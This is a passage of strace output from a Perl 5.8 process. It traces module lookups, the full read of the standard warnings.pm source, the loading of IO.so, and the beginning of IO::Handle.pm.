7444  07:18:47.728487 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728500 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728514 stat64("/usr/lib/perl5/warnings.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728525 stat64("/usr/lib/perl5/warnings.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728539 stat64("/usr/share/perl5/warnings.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728551 stat64("/usr/share/perl5/warnings.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728564 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728581 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728594 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728607 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
7444  07:18:47.728628 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.728643 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.728654 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.728672 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
7444  07:18:47.729117 brk(0x81b6000)    = 0x81b6000
7444  07:18:47.729366 brk(0x81b5000)    = 0x81b5000
7444  07:18:47.729549 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
7444  07:18:47.735210 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
7444  07:18:47.735943 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
7444  07:18:47.736072 read(8, "", 4096) = 0
7444  07:18:47.736089 close(8)          = 0
7444  07:18:47.736240 _llseek(6, 412, [412], SEEK_SET) = 0
7444  07:18:47.736255 _llseek(6, 0, [412], SEEK_CUR) = 0
7444  07:18:47.736277 close(6)          = 0
7444  07:18:47.736357 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
7444  07:18:47.736381 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
7444  07:18:47.736423 futex(0xb7fcd070, 0x81 /* FUTEX_??? */, 2147483647) = 0
7444  07:18:47.736439 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
7444  07:18:47.736453 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7444  07:18:47.736540 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
7444  07:18:47.736566 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7fd1000
7444  07:18:47.736579 mmap2(0xb7fd5000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7fd5000
7444  07:18:47.736593 close(6)          = 0
7444  07:18:47.736720 stat64("/etc/perl/IO/Handle.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736736 stat64("/etc/perl/IO/Handle.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736749 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736771 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736809 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736822 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736850 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736862 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736875 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736886 stat64("/usr/share/perl5/IO/Handle.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736899 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.736912 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
7444  07:18:47.736933 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
7444  07:18:47.736947 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d1d8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.736958 _llseek(6, 0, [0], SEEK_CUR) = 0
7444  07:18:47.736974 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode 